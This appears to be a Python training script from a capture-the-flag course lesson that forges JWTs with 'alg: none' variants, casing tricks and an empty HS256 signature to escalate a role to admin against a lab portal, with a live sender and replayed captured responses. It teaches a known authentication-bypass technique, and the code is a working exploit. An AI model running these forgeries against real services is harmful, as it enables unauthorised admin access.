#!/usr/bin/env python3
# recon.py — JWT alg:none (algorithm-confusion) recon capability (Lesson 04).
#
# The deterministic DATA layer, same role as Lessons 01-03: it finds shapes and
# classifies behaviour; it NEVER decides success — the WIN oracle is the single
# judge of success.
#
# Where this sits in the arc — the trust failure gets subtler each time:
#   L01 (broken access control): the cookie has NO integrity protection at all —
#       unsigned Base64 JSON. You edit `role` and re-encode. "No lock."
#   L03 (IDOR): the object reference isn't bound to you — you change a number.
#       "The lock exists, but it never checks you own this door."
#   L04 (JWT alg:none): the token IS signed (HS256) — integrity protection exists.
#       But the server reads the algorithm to use FROM THE TOKEN'S OWN HEADER and
#       trusts it. Declare `alg: none`, strip the signature, and the server treats
#       the token as "already verified." You didn't forge a signature; you changed
#       the server's instructions for *how to verify* — and it obeyed.
#       "The lock is signed, but you told it which key to use, and it believed you."
#
# So "recon" here is a BOUNDED SET of algorithm-downgrade forgeries, not a payload
# ladder or a fuzzer:
#   1. decode the token you hold  -> header (alg), payload (role), signature
#   2. name the lever             -> the server trusts header.alg; role is in the payload
#   3. forge a tiny fixed set     -> alg:none variants + an HS256 empty-sig trick
#   4. classify each response      -> BASELINE / WIN / ACCEPTED / REJECTED, via the oracle
#
# Like Lesson 02, the network call is an injected dependency (`send`): live mode
# posts each forged token as the session cookie with `requests`; the __main__ demo
# replays the REAL captured responses — no network, no key, just runs.
#
#   python3 recon.py                                        # offline demo (real captures)
#   python3 -c "import recon; recon.report(recon.recon())"  # live (needs requests)

import base64
import json
import re

TARGET = "https://manager.cyberzerk.fr"

# The token the portal issued us: header alg=HS256, payload role=employe, HMAC sig.
HELD_TOKEN = ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
              ".eyJ1c2VyIjoiZW1wbG95ZTg0NzIiLCJyb2xlIjoiZW1wbG95ZSJ9"
              ".s9ip1QaEfGwDjSo2VMn4p3fQ1PEGp8GixtSX-jeg6sM")

# --- Fixed forge set: a tiny hardcoded list of algorithm-downgrade mutations
#     (bounded execution, never a fuzzer).
#     (label, alg, set_role, form, intent)
#       form "keep"  -> send the token unchanged (the baseline)
#       form "dot"   -> header.payload.      (empty 3rd segment, trailing dot)
#       form "nodot" -> header.payload       (two-segment token, no trailing dot)
PROBES = [
    ("original",   None,    None,    "keep",  "the token you were issued — role=employe, the baseline"),
    ("none_dot",   "none",  "admin", "dot",   "alg=none, role=admin, empty signature + trailing dot"),
    ("none_nodot", "none",  "admin", "nodot", "same forgery as a two-segment token (no trailing dot)"),
    ("None_case",  "None",  "admin", "dot",   "capital 'None' — dodge a blocklist that only matches 'none'"),
    ("NONE_case",  "NONE",  "admin", "dot",   "upper 'NONE' — same idea, different casing"),
    ("hs256_empty","HS256", "admin", "dot",   "keep alg=HS256 but strip the sig — flawed verifiers skip a zero-length signature"),
]

# --- The WIN oracle: the ONLY thing allowed to say "it worked." -----------------
FLAG_RE = re.compile(r"CyberZerk\{.*?\}")

def win_oracle(body):
    """Deterministic success check. Returns the flag string, or None."""
    m = FLAG_RE.search(body or "")
    return m.group(0) if m else None

# The REJECT half of the signal: tokens a correct verifier throws back.
REJECT_TOKEN = "invalid"          # e.g. "invalid signature" / "signature verification failed"


# --- JWT codec (stdlib only) ----------------------------------------------------
def _b64url_decode(seg):
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)

def _b64url_encode(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

def decode_jwt(token):
    """Split a 2- or 3-segment JWT into header, payload, signature (strings)."""
    parts = token.split(".")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1]))
    sig = parts[2] if len(parts) > 2 else ""
    return header, payload, sig

def _encode_segment(obj):
    # compact separators keep the encoding canonical and stable
    return _b64url_encode(json.dumps(obj, separators=(",", ":")).encode())

def forge(token, alg=None, role=None, form="dot"):
    """Rebuild a token with a swapped alg and/or role, in the requested shape."""
    header, payload, _ = decode_jwt(token)
    if alg is not None:
        header = {"alg": alg, "typ": header.get("typ", "JWT")}
    if role is not None:
        payload = dict(payload, role=role)
    h, p = _encode_segment(header), _encode_segment(payload)
    if form == "nodot":
        return h + "." + p
    return h + "." + p + "."          # "dot": empty signature, trailing dot


# --- Classify one response, through the oracle ----------------------------------
def _classify(label, token, intent, status, body, is_baseline=False):
    if status is None:                                 # not fired (offline demo)
        return {"label": label, "token": token, "intent": intent, "fired": False,
                "status": None, "flag": None, "verdict": "CANDIDATE",
                "note": "in the forge set — run live to send it"}
    flag = win_oracle(body)
    low = (body or "").lower()
    if flag:
        verdict, note = "WIN", "flag present — the oracle fired"
    elif is_baseline:
        verdict, note = "BASELINE", "your real token, verified normally — the reference"
    elif REJECT_TOKEN in low or status in (400, 401, 403):
        verdict, note = "REJECTED", "the server verified properly and threw the forgery back"
    else:
        verdict, note = "ACCEPTED", "forgery accepted (no flag here) — the signature check was skipped"
    return {"label": label, "token": token, "intent": intent, "fired": True,
            "status": status, "flag": flag, "verdict": verdict, "note": note}


def recon(target=TARGET, token=HELD_TOKEN, send=None):
    """Decode the held token, forge the fixed set, classify each through the oracle."""
    send = send or _live_send(target)
    header, payload, sig = decode_jwt(token)

    probes = []
    for label, alg, role, form, intent in PROBES:
        tok = token if form == "keep" else forge(token, alg=alg, role=role, form=form)
        status, body = send(tok)
        probes.append(_classify(label, tok, intent, status, body,
                                is_baseline=(form == "keep")))

    return {
        "target": target,
        "held": {"header": header, "payload": payload, "sig_len": len(sig)},
        "lever": {"trusted_field": "header.alg",
                  "why": "the server reads which algorithm to verify with FROM the token"},
        "oracle": {"win": FLAG_RE.pattern, "reject_token": REJECT_TOKEN},
        "probes": probes,
        "bypass": any(p["verdict"] == "WIN" for p in probes),
    }


# --- Console report -------------------------------------------------------------
_GLYPH = {"WIN": "✓", "BASELINE": "·", "ACCEPTED": "!", "REJECTED": "=", "CANDIDATE": "?"}

def report(m):
    print(f"\n# TARGET   {m['target']}")
    h = m["held"]
    print(f"\n- HELD TOKEN")
    print(f"     header   {json.dumps(h['header'])}")
    print(f"     payload  {json.dumps(h['payload'])}")
    print(f"     signature {h['sig_len']} chars of HMAC-SHA256")
    lv = m["lever"]
    print(f"\n- LEVER    trusted field = {lv['trusted_field']}")
    print(f"     {lv['why']}")
    o = m["oracle"]
    print(f"\n- ORACLE   WIN = /{o['win']}/   REJECT token = {o['reject_token']!r}   (the only judge)")
    print("\n- FORGE SET   (fixed, one request each — not a fuzzer)")
    for p in m["probes"]:
        g = _GLYPH.get(p["verdict"], " ")
        tail = f"   ->  {p['flag']}" if p["flag"] else ""
        print(f"     [{g}] {p['verdict']:<9} {p['label']}{tail}")
        print(f"             {p['intent']}")
        print(f"             {p['note']}")
    print(f"\n- VERDICT    alg:none bypass {'CONFIRMED' if m['bypass'] else 'not observed in this set'}")
    print("             the signature existed; the server trusted the token's own choice not to check it.")


# --- Transports: live (requests) and replay (real captured responses) -----------
def _live_send(target):
    import requests
    sess = requests.Session()
    def _s(token):
        r = sess.get(target, cookies={"session": token}, timeout=10, verify=True)
        return r.status_code, r.text
    return _s

# Fixtures below are REAL responses captured during the hands-on run — not synthetic.
_EMPLOYE_BODY = """<!DOCTYPE html><html><head><title>Espace Employé</title></head><body>
<h1>Bonjour employe8472</h1><p>Rôle : employe. Vous n'avez pas accès à l'espace manager.</p>
</body></html>"""

_ADMIN_BODY = """<!DOCTYPE html><html><head><title>Manager Area</title></head><body>
<h1>Espace Manager — accès accordé</h1>
<div class="flag">CyberZerk{JWT_4lg_N0n3_C_3st_N0n}</div>
</body></html>"""

def _replay_send(token):
    # Match the captured tokens EXACTLY (alg casing is the whole point of the case
    # variants) — only the two responses actually observed are replayed.
    header, payload, _ = decode_jwt(token)
    alg = header.get("alg")                        # exact, not lowercased
    role = payload.get("role")
    if alg == "HS256" and role == "employe":
        return 200, _EMPLOYE_BODY                 # the real, correctly-signed token
    if alg == "none" and role == "admin" and token.endswith("."):
        return 200, _ADMIN_BODY                   # the forgery the server trusted
    return None, None                             # others not captured -> CANDIDATE


if __name__ == "__main__":
    print("=== recon.py — DEMO (offline; real captured responses) ===")
    report(recon(send=_replay_send))
    print("\n(Variants marked CANDIDATE weren't captured offline — run live to send them.)")
